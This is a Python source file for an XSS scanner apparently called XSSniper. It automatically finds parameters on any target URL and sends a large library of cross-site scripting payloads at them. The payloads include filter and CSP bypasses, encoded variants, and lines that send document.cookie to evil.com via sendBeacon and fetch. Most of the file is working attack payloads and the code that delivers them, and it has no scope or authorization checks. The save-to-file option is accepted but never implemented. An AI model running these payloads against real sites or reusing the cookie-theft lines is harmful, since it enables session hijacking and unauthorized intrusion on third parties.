#!/usr/bin/env python3
"""
Advanced Payload Tester - XSSniper Module
Professional Security Testing Framework
Developed by H4mzaX

Open Source Tool - Free for everyone to use
"""

import hashlib
import hmac
import time
import base64
import os
import sys
import platform
import uuid
import asyncio
import aiohttp
import json
import re
import argparse
import random
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

# License system removed - Open source tool for everyone

class AdvancedPayloadTester:
    """Advanced XSS payload testing with modern techniques"""
    
    def __init__(self, target_url, **kwargs):
        self.target_url = target_url
        self.timeout = kwargs.get('timeout', 15)
        self.max_concurrent = kwargs.get('threads', 20)
        self.delay = kwargs.get('delay', 0)
        self.verbose = kwargs.get('verbose', False)
        self.custom_payloads = kwargs.get('payloads', [])
        self.parameters = kwargs.get('parameters', [])
        self.output_file = kwargs.get('output_file')  # Only save if user specifies -o
        self.session = None
        self.successful_payloads = []
        self.tested_payloads = 0
        
        # Headers
        self.headers = {
            'User-Agent': kwargs.get('user_agent') or 
                         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        # Load advanced payloads
        self.payload_library = self._load_payload_library()
        self.encoding_methods = self._load_encoding_methods()

    def _load_payload_library(self):
        """Load comprehensive XSS payload library based on 2025 CVEs"""
        return {
            # Modern DOM-based XSS (CVE-2025-24017)
            'dom_based': [
                '<svg onload=alert(document.domain)>',
                '<img src=x onerror=alert(document.domain)>',
                '<iframe srcdoc="<script>alert(parent.document.domain)</script>">',
                '<details open ontoggle=alert(document.domain)>',
                '<marquee onstart=alert(document.domain)>',
                '<video><source onerror=alert(document.domain)>',
                '<audio src=x onerror=alert(document.domain)>',
                '<object data="javascript:alert(document.domain)">',
                '<embed src="javascript:alert(document.domain)">',
                '<form><button formaction="javascript:alert(document.domain)">',
                '<meter value=1 max=1 onmouseover=alert(document.domain)>',
                '<progress value=1 max=1 onmouseover=alert(document.domain)>',
                '<keygen onfocus=alert(document.domain) autofocus>',
                '<datalist><option value="<script>alert(document.domain)</script>">',
                '<style>@import"javascript:alert(document.domain)";</style>',
                '<link rel=stylesheet href="javascript:alert(document.domain)">',
                '<base href="javascript:alert(document.domain)//">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">'
            ],
            
            # Template literal injections (CVE-2025-26791)
            'template_literal': [
                '${alert(document.domain)}',
                '`${alert(document.domain)}`',
                '${alert`document.domain`}',
                '${eval("alert(document.domain)")}',
                '${Function("alert(document.domain)")()}',
                '${[].constructor.constructor("alert(document.domain)")()}',
                '${(()=>alert(document.domain))()}',
                '${window["alert"](document.domain)}',
                '${globalThis.alert(document.domain)}',
                '${this.alert(document.domain)}',
                '${top.alert(document.domain)}',
                '${parent.alert(document.domain)}',
                '${frames.alert(document.domain)}',
                '${self.alert(document.domain)}',
                '${document.defaultView.alert(document.domain)}'
            ],
            
            # Mutation XSS (mXSS)
            'mutation_xss': [
                '<listing>&lt;script&gt;alert(document.domain)&lt;/script&gt;</listing>',
                '<xmp>&lt;script&gt;alert(document.domain)&lt;/script&gt;</xmp>',
                '<plaintext>&lt;script&gt;alert(document.domain)&lt;/script&gt;',
                '<noscript><p title="</noscript><script>alert(document.domain)</script>">',
                '<template><script>alert(document.domain)</script></template>',
                '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">',
                '<svg><foreignObject><div><script>alert(document.domain)</script></div></foreignObject></svg>',
                '<iframe srcdoc="&lt;svg onload=alert(document.domain)&gt;">',
                '<textarea>&lt;script&gt;alert(document.domain)&lt;/script&gt;</textarea>',
                '<title>&lt;script&gt;alert(document.domain)&lt;/script&gt;</title>'
            ],
            
            # Modern framework bypasses
            'framework_bypass': [
                # React XSS
                '<div dangerouslySetInnerHTML={{__html: "javascript:alert(document.domain)"}} />',
                '{{constructor.constructor("alert(document.domain)")()}}',
                '<div className="javascript:alert(document.domain)">',
                '<script>React.createElement("script", {dangerouslySetInnerHTML: {__html: "alert(document.domain)"}})</script>',
                
                # Vue.js XSS
                '{{$eval("alert(document.domain)")}}',
                '{{this.constructor.constructor("alert(document.domain)")()}}',
                '<div v-html="javascript:alert(document.domain)">',
                '{{$root.constructor.constructor("alert(document.domain)")()}}',
                
                # Angular XSS
                '{{constructor.constructor("alert(document.domain)")()}}',
                '{{toString.constructor.prototype.toString.constructor.prototype.call.call(eval,"alert(document.domain)")}}',
                '<div [innerHTML]="javascript:alert(document.domain)">',
                '{{$on.constructor("alert(document.domain)")()}}'
            ],
            
            # CSP bypass techniques
            'csp_bypass': [
                '<link rel=dns-prefetch href="//evil.com">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
                '<base href="javascript:alert(document.domain)//">',
                '<script src="data:text/javascript,alert(document.domain)"></script>',
                '<iframe src="data:text/html,<script>alert(parent.document.domain)</script>">',
                '<object data="data:text/html,<script>alert(document.domain)</script>">',
                '<script>import("data:text/javascript,alert(document.domain)")</script>',
                '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))</script>',
                '<style>@import url("javascript:alert(document.domain)");</style>'
            ],
            
            # Modern HTML5 vectors
            'html5_vectors': [
                '<video poster="javascript:alert(document.domain)">',
                '<svg><animate attributeName=href values="javascript:alert(document.domain)" />',
                '<math><maction actiontype="statusline#javascript:alert(document.domain)">',
                '<canvas id="test" width="1" height="1"></canvas><script>document.getElementById("test").getContext("2d").fillText("",0,0);alert(document.domain)</script>',
                '<audio controls><source src="javascript:alert(document.domain)"></audio>',
                '<track kind="metadata" src="javascript:alert(document.domain)">',
                '<svg><use xlink:href="javascript:alert(document.domain)"></svg>',
                '<svg><image xlink:href="javascript:alert(document.domain)"></svg>'
            ],
            
            # Modern JavaScript techniques
            'modern_js': [
                '<script>setTimeout`alert\\x28document.domain\\x29`</script>',
                '<script>setInterval`alert\\x28document.domain\\x29`</script>',
                '<script>requestAnimationFrame`alert\\x28document.domain\\x29`</script>',
                '<script>Promise.resolve`alert\\x28document.domain\\x29`</script>',
                '<script>queueMicrotask`alert\\x28document.domain\\x29`</script>',
                '<script>new Function`alert\\x28document.domain\\x29```</script>',
                '<script>eval.call`${"alert\\x28document.domain\\x29"}`</script>',
                '<script>[].constructor.constructor`alert\\x28document.domain\\x29```</script>',
                '<script>top[atob`YWxlcnQ=`](document.domain)</script>',
                '<script>with(document)write("<script>alert(domain)</script>")</script>'
            ],
            
            # WebAssembly and modern APIs
            'modern_api': [
                '<script>navigator.sendBeacon("//evil.com",document.cookie)</script>',
                '<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script>',
                '<script>new WebSocket("ws://evil.com").onopen=()=>alert(document.domain)</script>',
                '<script>navigator.serviceWorker.register("data:application/javascript,alert(1)")</script>',
                '<script>new BroadcastChannel("test").postMessage(document.cookie)</script>',
                '<script>new SharedWorker("data:application/javascript,alert(1)")</script>',
                '<script>navigator.share({title:"XSS",text:document.cookie})</script>',
                '<script>new OffscreenCanvas(1,1).getContext("2d");alert(document.domain)</script>'
            ],
            
            # Unicode and encoding bypasses
            'encoding_bypass': [
                '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)</script>',
                '<script>alert(document[String.fromCharCode(100,111,109,97,105,110)])</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>',
                '<script>&#97;&#108;&#101;&#114;&#116;(document.domain)</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(document.domain)">',
                '<script>\\x61\\x6c\\x65\\x72\\x74(document.domain)</script>',
                '<script>alert(document["\\x64\\x6f\\x6d\\x61\\x69\\x6e"])</script>',
                '<script>eval("\\141\\154\\145\\162\\164(document.domain)")</script>'
            ],
            
            # Filter bypass techniques
            'filter_bypass': [
                '<ScRiPt>alert(document.domain)</ScRiPt>',
                '<script/>alert(document.domain)</script>',
                '<script>alert(document.domain)//</script>',
                '<script>/**/alert(document.domain)</script>',
                '<script>alert/**/document.domain)</script>',
                '"><script>alert(document.domain)</script>',
                "'><script>alert(document.domain)</script>",
                '<svg/onload=alert(document.domain)>',
                '<img/src=x/onerror=alert(document.domain)>',
                '<iframe/srcdoc="<script>alert(document.domain)</script>">',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'JaVaScRiPt:alert(document.domain)',
                'javascript&#x3a;alert(document.domain)',
                'java\tscript:alert(document.domain)',
                'java\nscript:alert(document.domain)',
                'java\rscript:alert(document.domain)'
            ]
        }

    def _load_encoding_methods(self):
        """Load encoding methods for payload obfuscation"""
        return {
            'url_encode': lambda payload: quote(payload, safe=''),
            'double_url_encode': lambda payload: quote(quote(payload, safe=''), safe=''),
            'html_entity': lambda payload: ''.join(f'&#{ord(c)};' for c in payload),
            'hex_encode': lambda payload: ''.join(f'%{ord(c):02x}' for c in payload),
            'unicode_encode': lambda payload: ''.join(f'\\u{ord(c):04x}' for c in payload),
            'base64_encode': lambda payload: base64.b64encode(payload.encode()).decode(),
            'mixed_case': lambda payload: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload))
        }

    async def init_session(self):
        """Initialize async HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=timeout,
            connector=aiohttp.TCPConnector(limit=100, limit_per_host=30)
        )

    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()

    def log(self, message, level="INFO"):
        """Enhanced logging function"""
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.RED + Back.YELLOW
        }
        
        color = colors.get(level, Fore.WHITE)
        if self.verbose or level in ["SUCCESS", "VULN", "ERROR"]:
            print(f"{color}[{timestamp}] [{level}] {message}")

    async def test_payload(self, url, payload, param_name, method='GET', encoding=None):
        """Test individual payload with advanced detection"""
        try:
            # Generate unique identifier for tracking
            unique_id = f"XSS_TEST_{random.randint(10000, 99999)}"
            test_payload = payload.replace('document.domain', f'"{unique_id}"')
            
            # Apply encoding if specified
            if encoding and encoding in self.encoding_methods:
                test_payload = self.encoding_methods[encoding](test_payload)
            
            # Build test URL
            if method.upper() == 'GET':
                test_url = f"{url}{'&' if '?' in url else '?'}{param_name}={test_payload}"
                
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    headers = dict(response.headers)
                    
            else:  # POST
                data = {param_name: test_payload}
                async with self.session.post(url, data=data) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    headers = dict(response.headers)
                    test_url = url
            
            # Advanced XSS detection
            if status_code == 200:
                detection_result = self.detect_xss_execution(
                    response_text, unique_id, content_type, test_payload, headers
                )
                
                if detection_result['is_vulnerable']:
                    return {
                        'vulnerable': True,
                        'url': test_url,
                        'payload': payload,
                        'test_payload': test_payload,
                        'parameter': param_name,
                        'method': method,
                        'encoding': encoding,
                        'unique_id': unique_id,
                        'detection_details': detection_result,
                        'response_length': len(response_text),
                        'status_code': status_code,
                        'content_type': content_type
                    }
            
            return {'vulnerable': False}
            
        except Exception as e:
            self.log(f"Error testing payload: {str(e)}", "ERROR")
            return {'vulnerable': False}

    def detect_xss_execution(self, response_text, unique_id, content_type, payload, headers):
        """Advanced XSS execution detection with context analysis"""
        if unique_id not in response_text:
            return {'is_vulnerable': False, 'reason': 'Unique ID not reflected'}
        
        detection_methods = []
        
        # 1. Direct script execution detection
        script_patterns = [
            f'<script[^>]*>{unique_id}',
            f'<script[^>]*>.*{unique_id}.*</script>',
            f'alert("{unique_id}")',
            f'alert\\("{unique_id}"\\)'
        ]
        
        for pattern in script_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                detection_methods.append('Direct script execution')
                break
        
        # 2. Event handler injection detection
        event_patterns = [
            f'on\\w+\\s*=\\s*["\']?[^"\']*{unique_id}[^"\']*["\']?',
            f'onerror\\s*=\\s*["\']?[^"\']*{unique_id}[^"\']*["\']?',
            f'onload\\s*=\\s*["\']?[^"\']*{unique_id}[^"\']*["\']?'
        ]
        
        for pattern in event_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detection_methods.append('Event handler injection')
                break
        
        # 3. JavaScript URL injection detection
        js_url_patterns = [
            f'href\\s*=\\s*["\']?javascript:[^"\']*{unique_id}[^"\']*["\']?',
            f'src\\s*=\\s*["\']?javascript:[^"\']*{unique_id}[^"\']*["\']?',
            f'action\\s*=\\s*["\']?javascript:[^"\']*{unique_id}[^"\']*["\']?'
        ]
        
        for pattern in js_url_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detection_methods.append('JavaScript URL injection')
                break
        
        # 4. Template literal injection detection
        template_patterns = [
            f'\\${{[^}}]*{unique_id}[^}}]*}}',
            f'`[^`]*{unique_id}[^`]*`',
            f'Function\\([^)]*{unique_id}[^)]*\\)'
        ]
        
        for pattern in template_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detection_methods.append('Template literal injection')
                break
        
        # 5. DOM manipulation detection
        dom_patterns = [
            f'innerHTML\\s*=\\s*["\']?[^"\']*{unique_id}[^"\']*["\']?',
            f'outerHTML\\s*=\\s*[^"\']*{unique_id}[^"\']*',
            f'document\\.write\\([^)]*{unique_id}[^)]*\\)',
            f'eval\\([^)]*{unique_id}[^)]*\\)'
        ]
        
        for pattern in dom_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detection_methods.append('DOM manipulation')
                break
        
        # 6. Framework-specific detection
        framework_patterns = [
            f'dangerouslySetInnerHTML[^}}]*{unique_id}',
            f'v-html[^>]*{unique_id}',
            f'\\[innerHTML\\][^>]*{unique_id}'
        ]
        
        for pattern in framework_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                detection_methods.append('Framework-specific injection')
                break
        
        # 7. Context-aware detection
        context_analysis = self.analyze_injection_context(response_text, unique_id)
        if context_analysis['dangerous_context']:
            detection_methods.append(f"Dangerous context: {context_analysis['context_type']}")
        
        # 8. Header-based detection
        dangerous_headers = ['X-XSS-Protection', 'Content-Security-Policy']
        for header in dangerous_headers:
            if header in headers and 'unsafe' in headers[header].lower():
                detection_methods.append('Unsafe security header detected')
        
        is_vulnerable = len(detection_methods) > 0
        
        return {
            'is_vulnerable': is_vulnerable,
            'detection_methods': detection_methods,
            'context_analysis': context_analysis,
            'confidence': self.calculate_confidence(detection_methods, context_analysis)
        }

    def analyze_injection_context(self, response_text, unique_id):
        """Analyze the context where payload is injected"""
        # Find all occurrences of unique_id and analyze surrounding context
        positions = [m.start() for m in re.finditer(re.escape(unique_id), response_text)]
        
        dangerous_contexts = []
        
        for pos in positions:
            # Extract context around injection point
            start = max(0, pos - 50)
            end = min(len(response_text), pos + len(unique_id) + 50)
            context = response_text[start:end]
            
            # Check for dangerous contexts
            if re.search(r'<script[^>]*>', context, re.IGNORECASE):
                dangerous_contexts.append('Script tag')
            elif re.search(r'on\w+\s*=\s*["\']?[^"\']*$', context[:50], re.IGNORECASE):
                dangerous_contexts.append('Event handler')
            elif 'javascript:' in context.lower():
                dangerous_contexts.append('JavaScript URL')
            elif re.search(r'<style[^>]*>', context, re.IGNORECASE):
                dangerous_contexts.append('Style tag')
            elif re.search(r'<\w+[^>]*\s+[^>]*>', context, re.IGNORECASE):
                dangerous_contexts.append('HTML attribute')
        
        return {
            'dangerous_context': len(dangerous_contexts) > 0,
            'context_type': ', '.join(set(dangerous_contexts)) if dangerous_contexts else 'Safe context',
            'total_reflections': len(positions)
        }

    def calculate_confidence(self, detection_methods, context_analysis):
        """Calculate confidence score for XSS detection"""
        base_score = 0
        
        # Points for different detection methods
        method_scores = {
            'Direct script execution': 40,
            'Event handler injection': 35,
            'JavaScript URL injection': 30,
            'Template literal injection': 35,
            'DOM manipulation': 30,
            'Framework-specific injection': 25,
            'Unsafe security header detected': 10
        }
        
        for method in detection_methods:
            for key, score in method_scores.items():
                if key in method:
                    base_score += score
                    break
        
        # Context analysis bonus
        if context_analysis['dangerous_context']:
            base_score += 20
        
        # Multiple reflections bonus
        if context_analysis['total_reflections'] > 1:
            base_score += 10
        
        return min(100, base_score)

    async def test_payload_category(self, url, parameter, category_name):
        """Test all payloads in a specific category"""
        if category_name not in self.payload_library:
            self.log(f"Unknown payload category: {category_name}", "ERROR")
            return
        
        self.log(f"Testing {category_name} payloads on parameter: {parameter}", "INFO")
        
        payloads = self.payload_library[category_name]
        semaphore = asyncio.Semaphore(self.max_concurrent)
        
        async def test_single_payload(payload):
            async with semaphore:
                self.log(f"Testing payload [{self.tested_payloads + 1}]: {payload[:60]}{'...' if len(payload) > 60 else ''}", "INFO")
                
                # Test payload without encoding
                result = await self.test_payload(url, payload, parameter, 'GET')
                if result['vulnerable']:
                    self.successful_payloads.append(result)
                    self.log(f"VULNERABILITY FOUND! Payload: {payload[:50]}...", "VULN")
                
                # Test with different encodings
                for encoding_name in ['url_encode', 'html_entity', 'unicode_encode']:
                    encoded_result = await self.test_payload(url, payload, parameter, 'GET', encoding_name)
                    if encoded_result['vulnerable']:
                        self.successful_payloads.append(encoded_result)
                        self.log(f"ENCODED VULNERABILITY FOUND! Encoding: {encoding_name}, Payload: {payload[:30]}...", "VULN")
                
                self.tested_payloads += 1
                
                if self.delay:
                    await asyncio.sleep(self.delay)
        
        # Test all payloads concurrently
        tasks = [test_single_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def test_custom_payloads(self, url, parameter):
        """Test custom user-provided payloads"""
        if not self.custom_payloads:
            return
        
        self.log(f"Testing {len(self.custom_payloads)} custom payloads", "INFO")
        
        for payload in self.custom_payloads:
            result = await self.test_payload(url, payload, parameter, 'GET')
            if result['vulnerable']:
                self.successful_payloads.append(result)
                self.log(f"CUSTOM PAYLOAD SUCCESSFUL! {payload}", "VULN")
            
            self.tested_payloads += 1
            
            if self.delay:
                await asyncio.sleep(self.delay)

    async def run_comprehensive_test(self):
        """Run comprehensive payload testing"""
        self.log(f"Starting comprehensive payload testing for: {self.target_url}", "INFO")
        
        await self.init_session()
        
        try:
            # Auto-discover parameters if none provided
            if not self.parameters:
                self.parameters = await self.auto_discover_parameters()
            
            if not self.parameters:
                self.log("No parameters found for testing", "WARNING")
                return
            
            # Test each parameter with all payload categories
            for parameter in self.parameters:
                self.log(f"Testing parameter: {parameter}", "INFO")
                
                # Test all payload categories
                for category_name in self.payload_library.keys():
                    await self.test_payload_category(self.target_url, parameter, category_name)
                
                # Test custom payloads
                await self.test_custom_payloads(self.target_url, parameter)
            
            self.generate_report()
            
        finally:
            await self.close_session()

    async def auto_discover_parameters(self):
        """Auto-discover parameters from URL and forms"""
        discovered_params = []
        
        # Extract URL parameters
        parsed_url = urlparse(self.target_url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            discovered_params.extend(params.keys())
        
        # Extract form parameters
        try:
            async with self.session.get(self.target_url) as response:
                if response.status == 200:
                    content = await response.text()
                    soup = BeautifulSoup(content, 'html.parser')
                    
                    forms = soup.find_all('form')
                    for form in forms:
                        inputs = form.find_all(['input', 'textarea', 'select'])
                        for input_tag in inputs:
                            name = input_tag.get('name')
                            if name:
                                discovered_params.append(name)
        except:
            pass
        
        # Remove duplicates and return
        return list(set(discovered_params))

    def generate_report(self):
        """Generate comprehensive testing report"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}ADVANCED PAYLOAD TESTING REPORT")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"{Fore.WHITE}Total payloads tested: {self.tested_payloads}")
        print(f"{Fore.WHITE}Total vulnerabilities found: {len(self.successful_payloads)}")
        
        if not self.successful_payloads:
            print(f"{Fore.GREEN}No XSS vulnerabilities detected.")
        else:
            print(f"\n{Fore.RED}VULNERABILITIES DETECTED:")
            print(f"{Fore.RED}{'='*50}")
            
            for i, vuln in enumerate(self.successful_payloads, 1):
                print(f"\n{Fore.RED}[{i}] Vulnerability Details")
                print(f"    URL: {vuln['url']}")
                print(f"    Parameter: {vuln['parameter']}")
                print(f"    Method: {vuln['method']}")
                print(f"    Payload: {vuln['payload']}")
                if vuln.get('encoding'):
                    print(f"    Encoding: {vuln['encoding']}")
                
                detection = vuln['detection_details']
                print(f"    Confidence: {detection['confidence']}%")
                print(f"    Detection Methods: {', '.join(detection['detection_methods'])}")
                print(f"    Context: {detection['context_analysis']['context_type']}")
                print(f"    Reflections: {detection['context_analysis']['total_reflections']}")
        
        # Save detailed report only if user wants it (-o flag will be added)
        # For now, just show the tip to use -o flag
        print(f"\n{Fore.YELLOW}💡 Tip: Use -o filename.json to save detailed report{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}")

def show_banner():
    """Display banner"""
    banner = f"""
{Fore.CYAN}    ╔══════════════════════════════════════════════════════╗
{Fore.CYAN}    ║      ⚡ Advanced Payload Tester Tool                ║
{Fore.CYAN}    ║              XSSniper Security Module                ║
{Fore.CYAN}    ║                Enhanced for 2025                     ║
{Fore.CYAN}    ╚══════════════════════════════════════════════════════╝
{Fore.MAGENTA}                     Developed by H4mzaX
{Style.RESET_ALL}
"""
    print(banner)

async def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='Advanced XSS Payload Tester')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--parameters', nargs='+', help='Parameters to test (auto-discovered if not provided)')
    parser.add_argument('--payloads', nargs='+', help='Custom payloads to test')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout (default: 15)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of concurrent threads (default: 20)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    
    args = parser.parse_args()
    
    try:
        tester = AdvancedPayloadTester(
            target_url=args.url,
            parameters=args.parameters or [],
            payloads=args.payloads or [],
            user_agent=args.user_agent,
            timeout=args.timeout,
            threads=args.threads,
            delay=args.delay,
            verbose=args.verbose,
            output_file=args.output
        )
        
        await tester.run_comprehensive_test()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Testing interrupted by user.")
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        show_banner()
        print(f"{Fore.YELLOW}Use --help for usage information")
        sys.exit(0)
    
    asyncio.run(main())
